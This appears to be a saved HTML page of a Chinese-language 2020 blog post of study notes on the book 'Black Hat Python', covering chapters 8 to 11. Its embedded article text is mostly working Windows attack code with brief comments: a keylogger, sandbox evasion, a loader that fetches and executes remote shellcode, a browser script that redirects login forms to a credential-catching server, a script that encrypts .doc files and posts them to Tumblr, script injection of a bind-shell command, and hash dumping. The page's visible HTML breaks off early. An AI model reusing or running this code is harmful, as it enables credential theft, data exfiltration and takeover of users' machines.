@@ -1,0 +1,966 @@
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>blackhat python - windows | 記事本</title>
+<meta name=keywords content><meta name=description content="動機
+這是對我來說最hardcore的部分
+都沒接觸過啊
+windows system programming
+memory forensics
+code injection (binary & shell code)
+超hardcode"><meta name=author content="zhengcf"><link rel=canonical href=https://littlebees.github.io/2020/09/blackhat-python-windows/><link crossorigin=anonymous href=/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z+V9+cO1A=" rel="preload stylesheet" as=style><link rel=icon href=https://littlebees.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://littlebees.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://littlebees.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://littlebees.github.io/apple-touch-icon.png><link rel=mask-icon href=https://littlebees.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="blackhat python - windows"><meta property="og:description" content="動機
+這是對我來說最hardcore的部分
+都沒接觸過啊
+windows system programming
+memory forensics
+code injection (binary & shell code)
+超hardcode"><meta property="og:type" content="article"><meta property="og:url" content="https://littlebees.github.io/2020/09/blackhat-python-windows/"><meta property="og:image" content="https://littlebees.github.io/images/papermod-cover.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-09-06T01:36:23+00:00"><meta property="article:modified_time" content="2020-09-06T01:36:23+00:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://littlebees.github.io/images/papermod-cover.png"><meta name=twitter:title content="blackhat python - windows"><meta name=twitter:description content="動機
+這是對我來說最hardcore的部分
+都沒接觸過啊
+windows system programming
+memory forensics
+code injection (binary & shell code)
+超hardcode"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://littlebees.github.io/posts/"},{"@type":"ListItem","position":2,"name":"blackhat python - windows","item":"https://littlebees.github.io/2020/09/blackhat-python-windows/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"blackhat python - windows","name":"blackhat python - windows","description":"動機 這是對我來說最hardcore的部分 都沒接觸過啊\nwindows system programming memory forensics code injection (binary \u0026amp; shell code)\n超hardcode\n","keywords":[],"articleBody":"動機 這是對我來說最hardcore的部分 都沒接觸過啊\nwindows system programming memory forensics code injection (binary \u0026 shell code)\n超hardcode\nCH8 主要是讓大家看看ctypes與pyhook的操作\nctypes is a foreign function library for Python. It provides C compatible data types, and allows calling functions in DLLs or shared libraries. It can be used to wrap these libraries in pure Python.\nThe pyHook package provides callbacks for global mouse and keyboard events in Windows. Python applications register event handlers for user input events such as left mouse down, left mouse up, key down, etc. and set the keyboard and/or mouse hook\nkeylogger.py\nfrom ctypes import * import pythoncom import pyHook import win32clipboard user32 = windll.user32 kernel32 = windll.kernel32 psapi = windll.psapi current_window = None def get_current_process(): # get a handle to the foreground window hwnd = user32.GetForegroundWindow() # find the process ID pid = c_ulong(0) user32.GetWindowThreadProcessId(hwnd, byref(pid)) # store the current process ID process_id = \"%d\" % pid.value # grab the executable executable = create_string_buffer(b'\\x00' * 512) h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid) psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512) # now read it's title window_title = create_string_buffer(b'\\x00' * 512) length = user32.GetWindowTextA(hwnd, byref(window_title), 512) # print out the header if we're in the right process print() print(\"[ PID: %s - %s - %s ]\" % (process_id, executable.value, window_title.value) ) print() # close handles kernel32.CloseHandle(hwnd) kernel32.CloseHandle(h_process) def KeyStroke(event): global current_window # check to see if target changed windows if event.WindowName != current_window: current_window = event.WindowName get_current_process() # if they pressed a standard key if 32 \u003c event.Ascii \u003c 127: print(chr(event.Ascii), end=' ') else: # if [Ctrl-V], get the value on the clipboard # added by Dan Frisch 2014 if event.Key == \"V\": win32clipboard.OpenClipboard() pasted_value = win32clipboard.GetClipboardData() win32clipboard.CloseClipboard() print(\"[PASTE] - %s\" % pasted_value, end=' ') else: print(\"[%s]\" % event.Key, end=' ') # pass execution to next hook registered return True # create and register a hook manager kl = pyHook.HookManager() kl.KeyDown = KeyStroke # register the hook and execute forever kl.HookKeyboard() pythoncom.PumpMessages() 就是掛callback這沒問題 但要注意的是handler 可以看成windows programming的參考(或是ptr)\nscreenshotter.py\nimport win32gui import win32ui import win32con import win32api # grab a handle to the main desktop window hdesktop = win32gui.GetDesktopWindow() # determine the size of all monitors in pixels width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN) height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN) left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN) top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN) # create a device context desktop_dc = win32gui.GetWindowDC(hdesktop) img_dc = win32ui.CreateDCFromHandle(desktop_dc) # create a memory based device context mem_dc = img_dc.CreateCompatibleDC() # create a bitmap object screenshot = win32ui.CreateBitmap() screenshot.CreateCompatibleBitmap(img_dc, width, height) mem_dc.SelectObject(screenshot) # copy the screen into our memory device context mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY) # save the bitmap to a file screenshot.SaveBitmapFile(mem_dc, 'c:\\\\WINDOWS\\\\Temp\\\\screenshot.bmp') # free our objects mem_dc.DeleteDC() win32gui.DeleteObject(screenshot.GetHandle()) Device Contexts(DC)就是呈現(或放置)圖像的地方 這code有三個DC\ndesktop memory(放圖的地方) bitmap(圖檔) 詳細的Device Contexts要搭配GDI programming來看\n整個流程是 desktop -\u003e memory -\u003e bitmap -\u003e .bmp\nsandbox_detect.py\nimport ctypes import random import time import sys user32 = ctypes.windll.user32 kernel32 = ctypes.windll.kernel32 keystrokes = 0 mouse_clicks = 0 double_clicks = 0 class LASTINPUTINFO(ctypes.Structure): _fields_ = [(\"cbSize\", ctypes.c_uint), (\"dwTime\", ctypes.c_ulong)] def get_last_input(): struct_lastinputinfo = LASTINPUTINFO() struct_lastinputinfo.cbSize = ctypes.sizeof(LASTINPUTINFO) # get last input registered user32.GetLastInputInfo(ctypes.byref(struct_lastinputinfo)) # now determine how long the machine has been running run_time = kernel32.GetTickCount() elapsed = run_time - struct_lastinputinfo.dwTime print(\"[*] It's been %d milliseconds since the last input event.\" % elapsed) return elapsed def get_key_press(): global mouse_clicks global keystrokes for i in range(0, 0xff): if user32.GetAsyncKeyState(i) == -32767: # 0x1 is the code for a left mouse click if i == 1: mouse_clicks += 1 return time.time() else: keystrokes += 1 return None def detect_sandbox(): global mouse_clicks global keystrokes max_keystrokes = random.randint(10, 25) max_mouse_clicks = random.randint(5, 25) double_clicks = 0 max_double_clicks = 10 double_click_threshold = 0.250 first_double_click = None average_mousetime = 0 max_input_threshold = 30000 previous_timestamp = None detection_complete = False last_input = get_last_input() # if we hit our threshold let's bail out if last_input \u003e= max_input_threshold: sys.exit(0) while not detection_complete: keypress_time = get_key_press() if keypress_time is not None and previous_timestamp is not None: # calculate the time between double clicks elapsed = keypress_time - previous_timestamp # the user double clicked if elapsed \u003c= double_click_threshold: double_clicks += 1 if first_double_click is None: # grab the timestamp of the first double click first_double_click = time.time() else: # did they try to emulate a rapid succession of clicks? if double_clicks == max_double_clicks: if keypress_time - first_double_click \u003c= ( max_double_clicks * double_click_threshold): sys.exit(0) # we are happy there's enough user input if keystrokes \u003e= max_keystrokes \\ and double_clicks \u003e= max_double_clicks \\ and mouse_clicks \u003e= max_mouse_clicks: return previous_timestamp = keypress_time elif keypress_time is not None: previous_timestamp = keypress_time detect_sandbox() print(\"We are ok!\") 用按鍵次數來判斷我們是不是在sanbox中，因為sandbox通常是自動化操作 所以按鍵次數相對固定\n有趣的是這裡處理按鍵是用ctypes硬幹，其實也可以用pyhooks\nshell_exec.py\nimport base64 import ctypes import urllib.request # retrieve the shellcode from our web server url = \"http://localhost:8000/shellcode.bin\" response = urllib.request.urlopen(url) # decode the shellcode from base64 shellcode = base64.b64decode(response.read()) # create a buffer in memory shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode)) # create a function pointer to our shellcode shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p)) # call our shellcode shellcode_func() 把bytes傳型成CFUNCTYPE來執行 很有趣!!\n不過要怎麼產生.bin? 參考CANVAS或是Metasploits\nCH9 CLE automation?? mitb.py\nimport time import urllib.parse import win32com.client data_receiver = \"http://localhost:8080/\" target_sites = { \"www.facebook.com\": { \"logout_url\": None, \"logout_form\": \"logout_form\", \"login_form_index\": 0, \"owned\": False }, \"accounts.google.com\": { \"logout_url\": \"https://accounts.google.com/Logout?hl=en\u0026continue=\" \"https://accounts.google.com/\" \"ServiceLogin%3Fservice%3Dmail\", \"logout_form\": None, \"login_form_index\": 0, \"owned\": False } } target_sites[\"www.gmail.com\"] = target_sites[\"accounts.google.com\"] target_sites[\"mail.google.com\"] = target_sites[\"accounts.google.com\"] clsid = '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}' windows = win32com.client.Dispatch(clsid) def wait_for_browser(browser): # wait for the browser to finish loading a page while browser.ReadyState != 4 and browser.ReadyState != \"complete\": time.sleep(0.1) return while True: for browser in windows: url = urllib.parse.urlparse(browser.LocationUrl) if url.hostname in target_sites: if target_sites[url.hostname][\"owned\"]: continue # if there is a URL we can just redirect if target_sites[url.hostname][\"logout_url\"]: browser.Navigate(target_sites[url.hostname][\"logout_url\"]) wait_for_browser(browser) else: # retrieve all elements in the document full_doc = browser.Document.all # iterate looking for the logout form for i in full_doc: try: # find the logout form and submit it if i.id == target_sites[url.hostname][\"logout_form\"]: i.submit() wait_for_browser(browser) except: pass try: # now we modify the login form login_index = target_sites[url.hostname][\"login_form_index\"] login_page = urllib.parse.quote(browser.LocationUrl) browser.Document.forms[login_index].action = \"%s%s\" % ( data_receiver, login_page) target_sites[url.hostname][\"owned\"] = True except: pass time.sleep(5) 這邊的想法是，先把user給logout，再把登入的request傳送到自己的http server來顯示資料，在forward到原本的server\n這邊是攔截ie的資料，那要ie幫忙的方法就是OLE Automation 就是\nclsid = '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}' # 可以當成程式在windows的是識別碼，就是座號啦 # 如何拿clsid? # https://www.c-sharpcorner.com/blogs/how-to-find-clsid-of-a-dll windows = win32com.client.Dispatch(clsid) # 註冊OLE automation 這兩行做的事\nie_exfil.py\nimport win32com.client import os import fnmatch import time import random import zlib import base64 from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_OAEP doc_type = \".doc\" username = \"test@test.com\" password = \"testpassword\" public_key = \"\"\"-----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyXUTgFoL/2EPKoN31l5T lak7VxhdusNCWQKDfcN5Jj45GQ1oZZjsECQ8jK5AaQuCWdmEQkgCEV23L2y71G+T h/zlVPjp0hgC6nOKOuwmlQ1jGvfVvaNZ0YXrs+sX/wg5FT/bTS4yzXeW6920tdls 2N7Pu5N1FLRW5PMhk6GW5rzVhwdDvnfaUoSVj7oKaIMLbN/TENvnwhZZKlTZeK79 ix4qXwYLe66CrgCHDf4oBJ/nO1oYwelxuIXVPhIZnVpkbz3IL6BfEZ3ZDKzGeRs6 YLZuR2u5KUbr9uabEzgtrLyOeoK8UscKmzOvtwxZDcgNijqMJKuqpNZczPHmf9cS 1wIDAQAB -----END PUBLIC KEY-----\"\"\" def wait_for_browser(browser): # wait for the browser to finish loading a page while browser.ReadyState != 4 and browser.ReadyState != \"complete\": time.sleep(0.1) return def encrypt_string(plaintext): chunk_size = 208 if isinstance(plaintext, (str)): plaintext = plaintext.encode() print(\"Compressing: %d bytes\" % len(plaintext)) plaintext = zlib.compress(plaintext) print(\"Encrypting %d bytes\" % len(plaintext)) rsakey = RSA.importKey(public_key) rsakey = PKCS1_OAEP.new(rsakey) encrypted = b\"\" offset = 0 while offset \u003c len(plaintext): chunk = plaintext[offset:offset + chunk_size] if len(chunk) % chunk_size != 0: chunk += b\" \" * (chunk_size - len(chunk)) encrypted += rsakey.encrypt(chunk) offset += chunk_size encrypted = base64.b64encode(encrypted) print(\"Base64 encoded crypto: %d\" % len(encrypted)) return encrypted def encrypt_post(filename): # open and read the file fd = open(filename, \"rb\") contents = fd.read() fd.close() encrypted_title = encrypt_string(filename) encrypted_body = encrypt_string(contents) return encrypted_title, encrypted_body def random_sleep(): time.sleep(random.randint(5, 10)) return def login_to_tumblr(ie): # retrieve all elements in the document full_doc = ie.Document.all # iterate looking for the logout form for i in full_doc: if i.id == \"signup_email\": i.setAttribute(\"value\", username) elif i.id == \"signup_password\": i.setAttribute(\"value\", password) random_sleep() # you can be presented with different homepages try: if ie.Document.forms[0].id == \"signup_form\": ie.Document.forms[0].submit() else: ie.Document.forms[1].submit() except IndexError: pass random_sleep() # the login form is the second form on the page wait_for_browser(ie) return def post_to_tumblr(ie, title, post): full_doc = ie.Document.all for i in full_doc: if i.id == \"post_one\": i.setAttribute(\"value\", title) title_box = i i.focus() elif i.id == \"post_two\": i.setAttribute(\"innerHTML\", post) print(\"Set text area\") i.focus() elif i.id == \"create_post\": print(\"Found post button\") post_form = i i.focus() # move focus away from the main content box random_sleep() title_box.focus() random_sleep() # post the form post_form.children[0].click() wait_for_browser(ie) random_sleep() return def exfiltrate(document_path): ie = win32com.client.Dispatch(\"InternetExplorer.Application\") ie.Visible = 1 # head to tumblr and login ie.Navigate(\"http://www.tumblr.com/login\") wait_for_browser(ie) print(\"Logging in...\") login_to_tumblr(ie) print(\"Logged in...navigating\") ie.Navigate(\"https://www.tumblr.com/new/text\") wait_for_browser(ie) # encrypt the file title, body = encrypt_post(document_path) print(\"Creating new post...\") post_to_tumblr(ie, title, body) print(\"Posted!\") # Destroy the IE instance ie.Quit() ie = None return # main loop for document discovery for parent, directories, filenames in os.walk(\"C:\\\\\"): for filename in fnmatch.filter(filenames, \"*%s\" % doc_type): document_path = os.path.join(parent, filename) print(\"Found: %s\" % document_path) exfiltrate(document_path) input(\"Continue?\") 加密filepath，po到tumblr去\nkeygen.py \u0026 decryptor.py\nimport zlib import base64 from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_OAEP new_key = RSA.generate(2048) public_key = new_key.publickey().exportKey(\"PEM\") private_key = new_key.exportKey(\"PEM\") encrypted = \"\"\"XxfaX7nfQ48K...................G2V+2zuq6ol8Cs=\"\"\" private_key = \"\"\"-----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEAyXUTgFoL/2EPKoN31l5Tlak7VxhdusNCWQKDfcN5Jj45GQ1o ................................... vOGHt9D9yo3DOhyvJbedpi3u3g13G+FZFw6d1T8Jzm5eZUvG7WeUtg== -----END RSA PRIVATE KEY-----\"\"\" rsakey = RSA.importKey(private_key) rsakey = PKCS1_OAEP.new(rsakey) offset = 0 decrypted = \"\" encrypted = base64.b64decode(encrypted) while offset \u003c len(encrypted): decrypted += rsakey.decrypt(encrypted[offset:offset + 256]) offset += 256 # now we decompress to original plaintext = zlib.decompress(decrypted) print(plaintext) 就是加解密，原本是兩個檔案，但因為這很好理解他們想幹嘛，同時又都不長，就合併在一起了\ncred_server.py\nimport http.server import socketserver import urllib.error import urllib.parse import urllib.request class CredRequestHandler(http.server.SimpleHTTPRequestHandler): def do_POST(self): content_length = int(self.headers['Content-Length']) creds = self.rfile.read(content_length).decode('utf-8') print(creds) site = self.path[1:] self.send_response(301) self.send_header('Location', urllib.parse.unquote(site)) self.end_headers() server = socketserver.TCPServer(('0.0.0.0', 8080), CredRequestHandler) server.serve_forever() 就是會顯示request的http server\nCH10 這裡的目的是找出\n高權限process會使用的檔案，但其檔案可以被低權限的使用者取用的檔案\n以此繞過權限管制\n下面的兩個code就是分別\n找出高權限(有趣的)process 當檔案被修改時插入我們的code process_monitor.py\nimport win32con import win32api import win32security import wmi import os LOG_FILE = \"process_monitor_log.csv\" def get_process_privileges(pid): try: # obtain a handle to the target process hproc = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION, False, pid) # open the main process token htok = win32security.OpenProcessToken(hproc, win32con.TOKEN_QUERY) # retrieve the list of privileges enabled privs = win32security.GetTokenInformation( htok, win32security.TokenPrivileges) # iterate over privileges and output the ones that are enabled priv_list = [] for priv_id, priv_flags in privs: # check if the privilege is enabled if priv_flags == 3: priv_list.append( win32security.LookupPrivilegeName(None, priv_id)) except: priv_list.append(\"N/A\") return \"|\".join(priv_list) def log_to_file(message): fd = open(LOG_FILE, \"ab\") fd.write(\"%s\\r\\n\" % message) fd.close() return # create a log file header if not os.path.isfile(LOG_FILE): log_to_file(\"Time,User,Executable,CommandLine,PID,ParentPID,Privileges\") # instantiate the WMI interface c = wmi.WMI() # create our process monitor process_watcher = c.Win32_Process.watch_for(\"creation\") while True: try: new_process = process_watcher() proc_owner = new_process.GetOwner() proc_owner = \"%s\\\\%s\" % (proc_owner[0], proc_owner[2]) create_date = new_process.CreationDate executable = new_process.ExecutablePath cmdline = new_process.CommandLine pid = new_process.ProcessId parent_pid = new_process.ParentProcessId privileges = get_process_privileges(pid) process_log_message = \"%s,%s,%s,%s,%s,%s,%s\" % ( create_date, proc_owner, executable, cmdline, pid, parent_pid, privileges) print(\"%s\\r\\n\" % process_log_message) log_to_file(process_log_message) except: pass 把所有新產生的process的權限列出來 這邊使用的是windows WMI API\n這邊有一些有趣的權限，但就不列出詳細的作用(懶)\nSeBackupPrivilege SeDebugPrivilege SeLoadDriver file_monitor.py\n# Modified example that is originally given here: # http://timgolden.me.uk/python/win32_how_do_i/watch_directory_for_changes.html import tempfile import threading import win32file import win32con import os # these are the common temp file directories dirs_to_monitor = [\"C:\\\\WINDOWS\\\\Temp\", tempfile.gettempdir()] # file modification constants FILE_CREATED = 1 FILE_DELETED = 2 FILE_MODIFIED = 3 FILE_RENAMED_FROM = 4 FILE_RENAMED_TO = 5 # extension based code snippets to inject file_types = {} command = \"C:\\\\WINDOWS\\\\TEMP\\\\bhpnet.exe –l –p 9999 –c\" file_types['.vbs'] = [\"\\r\\n'bhpmarker\\r\\n\", \"\\r\\nCreateObject(\\\"Wscript.Shell\\\").Run(\\\"%s\\\")\\r\\n\" % command] file_types['.bat'] = [\"\\r\\nREM bhpmarker\\r\\n\", \"\\r\\n%s\\r\\n\" % command] file_types['.ps1'] = [\"\\r\\n#bhpmarker\", \"Start-Process \\\"%s\\\"\" % command] def inject_code(full_filename, extension, contents): # is our marker already in the file? if file_types[extension][0] in contents: return # no marker let's inject the marker and code full_contents = file_types[extension][0] full_contents += file_types[extension][1] full_contents += contents fd = open(full_filename, \"wb\") fd.write(full_contents.encode()) fd.close() print(\"[\\o/] Injected code.\") return def start_monitor(path_to_watch): # we create a thread for each monitoring run file_list_directory = 0x0001 h_directory = win32file.CreateFile( path_to_watch, file_list_directory, win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE, None, win32con.OPEN_EXISTING, win32con.FILE_FLAG_BACKUP_SEMANTICS, None) while 1: try: results = win32file.ReadDirectoryChangesW( h_directory, 1024, True, win32con.FILE_NOTIFY_CHANGE_FILE_NAME | win32con.FILE_NOTIFY_CHANGE_DIR_NAME | win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES | win32con.FILE_NOTIFY_CHANGE_SIZE | win32con.FILE_NOTIFY_CHANGE_LAST_WRITE | win32con.FILE_NOTIFY_CHANGE_SECURITY, None, None ) for action, file_name in results: full_filename = os.path.join(path_to_watch, file_name) if action == FILE_CREATED: print(\"[ + ] Created %s\" % full_filename) elif action == FILE_DELETED: print(\"[ - ] Deleted %s\" % full_filename) elif action == FILE_MODIFIED: print(\"[ * ] Modified %s\" % full_filename) # dump out the file contents print(\"[vvv] Dumping contents...\") try: fd = open(full_filename, \"rb\") contents = fd.read() fd.close() print(contents) print(\"[^^^] Dump complete.\") filename, extension = os.path.splitext(full_filename) if extension in file_types: inject_code(full_filename, extension, contents) except: print(\"[!!!] Failed.\") elif action == FILE_RENAMED_FROM: print(\"[ \u003e ] Renamed from: %s\" % full_filename) elif action == FILE_RENAMED_TO: print(\"[ \u003c ] Renamed to: %s\" % full_filename) else: print(\"[???] Unknown: %s\" % full_filename) except: pass for path in dirs_to_monitor: monitor_thread = threading.Thread(target=start_monitor, args=(path,)) print(\"Spawning monitoring thread for path: %s\" % path) monitor_thread.start() 當script file被改的時候，插入我們的code\nCH11 示範Volatility的使用 這裡是利用Volatility針對惡意程式分析的tutorial\ngrabhashes.py\nimport sys import volatility.conf as conf import volatility.registry as registry import volatility.commands as commands import volatility.addrspace as addrspace from volatility.plugins.registry.registryapi import RegistryApi from volatility.plugins.registry.lsadump import HashDump memory_file = \"WinXPSP2.vmem\" sys.path.append(\"/Downloads/volatility-2.3.1\") registry.PluginImporter() config = conf.ConfObject() config.parse_options() config.PROFILE = \"WinXPSP2x86\" config.LOCATION = \"file://%s\" % memory_file registry.register_global_options(config, commands.Command) registry.register_global_options(config, addrspace.BaseAddressSpace) registry = RegistryApi(config) registry.populate_offsets() sam_offset = None sys_offset = None for offset in registry.all_offsets: if registry.all_offsets[offset].endswith(\"\\\\SAM\"): sam_offset = offset print(\"[*] SAM: 0x%08x\" % offset) if registry.all_offsets[offset].endswith(\"\\\\system\"): sys_offset = offset print(\"[*] System: 0x%08x\" % offset) if sam_offset is not None and sys_offset is not None: config.sys_offset = sys_offset config.sam_offset = sam_offset hashdump = HashDump(config) for hash in hashdump.calculate(): print(hash) break if sam_offset is None or sys_offset is None: print(\"[*] Failed to find the system or SAM offsets.\") windows的本機密碼放在SAM registry hive 開機金鑰放在system registry hive\n用指令會是\npython vol.py imageinfo -f \"memdump.img\" # get suggested profile python vol.py hivelist --profile=\"WinXPSP2x86\" -f \"memdump.vmem\" # Virual Physical Name # ------ -------- ---- # ... # abc def \\Device\\HarddiskVolume1\\WINDOWS\\system32\\config\\SAM # ghi jkl \\Device\\HarddiskVolume1\\WINDOWS\\system32\\config\\system # ... python vol.py hashdump --profile=\"WinXPSP2x86\" -f \"memdump.vmem\" -y ghi -s abc codecoverage.py\nfrom immlib import * class CcHook(LogBpHook): def __init__(self): LogBpHook.__init__(self) self.imm = Debugger() def run(self, regs): self.imm.log(\"%08x\" % regs['EIP'], regs['EIP']) self.imm.deleteBreakpoint(regs['EIP']) return def main(args): imm = Debugger() calc = imm.getModule(\"calc.exe\") imm.analyseCode(calc.getCodebase()) functions = imm.getAllFunctions(calc.getCodebase()) hooker = CcHook() for function in functions: hooker.add(\"%08x\" % function, function) return \"Tracking %d functions.\" % len(functions) 這個是為了找出特定function的記憶體位置 利用Immunity Debugger的breakpoint把記憶體位置在中斷時列出來 使用方法!code_coverage\ncode_inject.py\nimport sys import struct import volatility.conf as conf import volatility.registry as registry import volatility.commands as commands import volatility.addrspace as addrspace import volatility.plugins.taskmods as taskmods equals_button = 0x01005D51 # from codecoverage.py memory_file = \"/Users/justin/Documents/Virtual Machines.localized/\" \\ \"Windows Server 2003 Standard Edition.vmwarevm/\" \\ \"564d9400-1cb2-63d6-722b-4ebe61759abd.vmem\" slack_space = None trampoline_offset = None # read in our shellcode sc_fd = open(\"cmeasure.bin\", \"rb\") sc = sc_fd.read() sc_fd.close() sys.path.append(\"/Downloads/volatility-2.3.1\") registry.PluginImporter() config = conf.ConfObject() registry.register_global_options(config, commands.Command) registry.register_global_options(config, addrspace.BaseAddressSpace) config.parse_options() config.PROFILE = \"Win2003SP2x86\" config.LOCATION = \"file://%s\" % memory_file p = taskmods.PSList(config) # Print all running processes by following the EPROCESS lists. for process in p.calculate(): if str(process.ImageFileName) == \"calc.exe\": print(\"[*] Found calc.exe with PID %d\" % process.UniqueProcessId) print(\"[*] Hunting for physical offsets...please wait.\") address_space = process.get_process_address_space() pages = address_space.get_available_pages() for page in pages: physical = address_space.vtop(page[0]) # page[0]是位置 page[1]是大小 if physical is not None: if slack_space is None: fd = open(memory_file, \"r+\") fd.seek(physical) buf = fd.read(page[1]) try: offset = buf.index(\"\\x00\" * len(sc)) slack_space = page[0] + offset print(\"[*] Found good shellcode location!\") print(\"[*] Virtual address: 0x%08x\" % slack_space) print(\"[*] Physical address: 0x%08x\" % ( physical + offset)) print(\"[*] Injecting shellcode.\") fd.seek(physical + offset) fd.write(sc.decode()) fd.flush() # create our trampoline tramp = \"\\xbb%s\" % struct.pack(\"","wordCount":"2525","inLanguage":"en","datePublished":"2020-09-06T01:36:23Z","dateModified":"2020-09-06T01:36:23Z","author":{"@type":"Person","name":"zhengcf"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://littlebees.github.io/2020/09/blackhat-python-windows/"},"publisher":{"@type":"Organization","name":"記事本","logo":{"@type":"ImageObject","url":"https://littlebees.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://littlebees.github.io/ accesskey=h title="記事本 (Alt + H)">記事本</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://littlebees.github.io/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://littlebees.github.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://littlebees.github.io/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://littlebees.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://littlebees.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">blackhat python - windows</h1><div class=post-meta><span title='2020-09-06 01:36:23 +0000 UTC'>September 6, 2020</span>&nbsp;·&nbsp;12 min&nbsp;·&nbsp;zhengcf</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#%e5%8b%95%e6%a9%9f aria-label=動機>動機</a></li><li><a href=#ch8 aria-label=CH8>CH8</a></li><li><a href=#ch9 aria-label=CH9>CH9</a></li><li><a href=#ch10 aria-label=CH10>CH10</a></li><li><a href=#ch11 aria-label=CH11>CH11</a></li></ul></div></details></div><div class=post-content><h2 id=動機>動機<a hidden class=anchor aria-hidden=true href=#動機>#</a></h2><p>這是對我來說最hardcore的部分
+都沒接觸過啊</p><p>windows system programming
+memory forensics
+code injection (binary & shell code)</p><p>超hardcode</p><h2 id=ch8>CH8<a hidden class=anchor aria-hidden=true href=#ch8>#</a></h2><p>主要是讓大家看看ctypes與pyhook的操作</p><blockquote><p>ctypes is a foreign function library for Python.
+It provides C compatible data types, and allows calling functions in DLLs or shared libraries.
+It can be used to wrap these libraries in pure Python.</p></blockquote><blockquote><p>The pyHook package provides callbacks for global mouse and keyboard events in Windows.
+Python applications register event handlers for user input events such as left mouse down, left mouse up, key down, etc. and set the keyboard and/or mouse hook</p></blockquote><p>keylogger.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>ctypes</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pythoncom</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pyHook</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>win32clipboard</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>user32</span> <span class=o>=</span> <span class=n>windll</span><span class=o>.</span><span class=n>user32</span>
+</span></span><span class=line><span class=cl><span class=n>kernel32</span> <span class=o>=</span> <span class=n>windll</span><span class=o>.</span><span class=n>kernel32</span>
